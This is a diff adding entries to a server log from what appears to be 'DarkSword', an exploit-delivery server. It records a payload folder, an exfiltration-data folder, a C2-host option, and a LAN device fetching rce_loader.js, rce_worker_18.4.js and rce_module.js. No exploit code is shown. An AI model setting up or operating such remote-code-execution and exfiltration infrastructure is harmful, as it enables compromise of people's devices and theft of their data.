@@ -27,3 +27,61 @@
 [2026-07-19 10:26:25] GET /.well-known/appspecific/com.chrome.devtools.json from 127.0.0.1
 [2026-07-19 10:26:25] [REQUEST] code 404, message File not found
 [2026-07-19 10:26:25] [REQUEST] "GET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1" 404 -
+[2026-07-19 16:47:41] DarkSword server listening on http://0.0.0.0:8080
+[2026-07-19 16:47:41] Payloads: D:\wwwroot\darksword\payloads
+[2026-07-19 16:47:41] Access: http://localhost:8080/ or http://<IP>:8080/
+[2026-07-19 16:47:41] rce_loader localHost: auto from each request Host (http). Use --c2-host https://... if you need HTTPS or a public URL.
+[2026-07-19 16:47:41] Exfil data saved to: D:\wwwroot\darksword\exfil
+[2026-07-19 16:47:41] Logs saved to: D:\wwwroot\darksword\server.log
+[2026-07-19 16:49:16] DarkSword server listening on http://0.0.0.0:8080
+[2026-07-19 16:49:16] Payloads: D:\wwwroot\darksword\payloads
+[2026-07-19 16:49:16] Access: http://localhost:8080/ or http://<IP>:8080/
+[2026-07-19 16:49:16] rce_loader localHost: auto from each request Host (http). Use --c2-host https://... if you need HTTPS or a public URL.
+[2026-07-19 16:49:16] Exfil data saved to: D:\wwwroot\darksword\exfil
+[2026-07-19 16:49:16] Logs saved to: D:\wwwroot\darksword\server.log
+[2026-07-19 16:52:31] DarkSword server listening on http://0.0.0.0:8080
+[2026-07-19 16:52:31] Payloads: D:\wwwroot\darksword\payloads
+[2026-07-19 16:52:31] Access: http://localhost:8080/ or http://<IP>:8080/
+[2026-07-19 16:52:31] rce_loader localHost: auto from each request Host (http). Use --c2-host https://... if you need HTTPS or a public URL.
+[2026-07-19 16:52:31] Exfil data saved to: D:\wwwroot\darksword\exfil
+[2026-07-19 16:52:31] Logs saved to: D:\wwwroot\darksword\server.log
+[2026-07-19 16:52:59] GET / from 127.0.0.1
+[2026-07-19 16:52:59] [REQUEST] "GET / HTTP/1.1" 200 -
+[2026-07-19 16:53:55] DarkSword server listening on http://0.0.0.0:8080
+[2026-07-19 16:53:55] Payloads: D:\wwwroot\darksword\payloads
+[2026-07-19 16:53:55] Access: http://localhost:8080/ or http://<IP>:8080/
+[2026-07-19 16:53:55] rce_loader localHost: auto from each request Host (http). Use --c2-host https://... if you need HTTPS or a public URL.
+[2026-07-19 16:53:55] Exfil data saved to: D:\wwwroot\darksword\exfil
+[2026-07-19 16:53:55] Logs saved to: D:\wwwroot\darksword\server.log
+[2026-07-19 16:54:11] GET / from 127.0.0.1 (device: 649ce0e6f9b9ea2c53c4d6276d8c775f)
+[2026-07-19 16:54:11] [REQUEST] "GET / HTTP/1.1" 200 -
+[2026-07-19 18:10:46] GET / from 192.168.31.198 (device: 1c0b5f56ecd02a385d48ee057e0fca67)
+[2026-07-19 18:10:46] [REQUEST] "GET / HTTP/1.1" 200 -
+[2026-07-19 18:10:46] GET /frame.html?0.801102252763313 from 192.168.31.198 (device: 1c0b5f56ecd02a385d48ee057e0fca67)
+[2026-07-19 18:10:46] [REQUEST] "GET /frame.html?0.801102252763313 HTTP/1.1" 200 -
+[2026-07-19 18:10:46] GET /rce_loader.js?1784455846769 from 192.168.31.198 (device: 1c0b5f56ecd02a385d48ee057e0fca67)
+[2026-07-19 18:10:46] [REQUEST] "GET /rce_loader.js?1784455846769 HTTP/1.1" 200 -
+[2026-07-19 18:10:46] GET /rce_worker_18.4.js?1784455846797 from 192.168.31.198 (device: 1c0b5f56ecd02a385d48ee057e0fca67)
+[2026-07-19 18:10:46] [REQUEST] "GET /rce_worker_18.4.js?1784455846797 HTTP/1.1" 200 -
+[2026-07-19 18:10:46] GET /rce_module.js?1784455846829 from 192.168.31.198 (device: 1c0b5f56ecd02a385d48ee057e0fca67)
+[2026-07-19 18:10:46] [REQUEST] "GET /rce_module.js?1784455846829 HTTP/1.1" 200 -
+[2026-07-19 18:15:39] GET / from 127.0.0.1 (device: 649ce0e6f9b9ea2c53c4d6276d8c775f)
+[2026-07-19 18:15:39] [REQUEST] "GET / HTTP/1.1" 200 -
+[2026-07-19 18:19:21] DarkSword server listening on http://0.0.0.0:8080
+[2026-07-19 18:19:21] Payloads: D:\wwwroot\darksword\payloads
+[2026-07-19 18:19:21] Access: http://localhost:8080/ or http://<IP>:8080/
+[2026-07-19 18:19:21] rce_loader localHost: auto from each request Host (http). Use --c2-host https://... if you need HTTPS or a public URL.
+[2026-07-19 18:19:21] Exfil data saved to: D:\wwwroot\darksword\exfil
+[2026-07-19 18:19:21] Logs saved to: D:\wwwroot\darksword\server.log
+[2026-07-19 18:19:37] GET / from 127.0.0.1 (device: 649ce0e6f9b9ea2c53c4d6276d8c775f)
+[2026-07-19 18:19:37] [REQUEST] "GET / HTTP/1.1" 200 -
+[2026-07-19 18:25:28] GET / from 192.168.31.198 (device: 1c0b5f56ecd02a385d48ee057e0fca67)
+[2026-07-19 18:25:28] [REQUEST] "GET / HTTP/1.1" 200 -
+[2026-07-19 18:25:28] GET /frame.html?0.4253992499046385 from 192.168.31.198 (device: 1c0b5f56ecd02a385d48ee057e0fca67)
+[2026-07-19 18:25:28] [REQUEST] "GET /frame.html?0.4253992499046385 HTTP/1.1" 200 -
+[2026-07-19 18:25:28] GET /rce_loader.js?1784456728917 from 192.168.31.198 (device: 1c0b5f56ecd02a385d48ee057e0fca67)
+[2026-07-19 18:25:28] [REQUEST] "GET /rce_loader.js?1784456728917 HTTP/1.1" 200 -
+[2026-07-19 18:25:28] GET /rce_worker_18.4.js?1784456728944 from 192.168.31.198 (device: 1c0b5f56ecd02a385d48ee057e0fca67)
+[2026-07-19 18:25:28] [REQUEST] "GET /rce_worker_18.4.js?1784456728944 HTTP/1.1" 200 -
+[2026-07-19 18:25:28] GET /rce_module.js?1784456729075 from 192.168.31.198 (device: 1c0b5f56ecd02a385d48ee057e0fca67)
+[2026-07-19 18:25:28] [REQUEST] "GET /rce_module.js?1784456729075 HTTP/1.1" 200 -
